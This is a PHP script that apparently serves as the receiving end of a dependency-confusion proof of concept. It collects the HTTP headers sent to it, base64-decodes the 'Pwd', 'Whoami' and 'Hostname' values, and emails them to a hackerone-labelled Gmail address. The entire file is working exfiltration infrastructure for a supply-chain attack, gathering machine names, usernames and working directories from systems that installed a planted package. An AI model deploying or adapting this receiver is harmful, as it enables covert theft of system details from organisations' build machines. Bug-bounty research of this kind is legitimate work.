<?php

function getRequestHeaders() {
    $headers = array();
    foreach($_SERVER as $key => $value) {
        if (substr($key, 0, 5) <> 'HTTP_') {
            continue;
        }
        $header = str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))));
        $headers[$header] = $value;
    }
    return $headers;
}

$headers = getRequestHeaders();
$msg = '';
foreach ($headers as $header => $value) {
    
    $v = $value;
    
    if ($header == 'Pwd' || $header == 'Whoami' || $header == 'Hostname') {
        $v = base64_decode($value);
    }

    $msg = $msg."$header: $v <br />\n";
}

// echo $msg;


$emailHeaders = "From: no-reply@kaspat.com\r\n";
$subject = "Dependency Confusion PoC";
$to = "codermak.hackerone@gmail.com";

mail($to, $subject, $msg, $emailHeaders);

?>
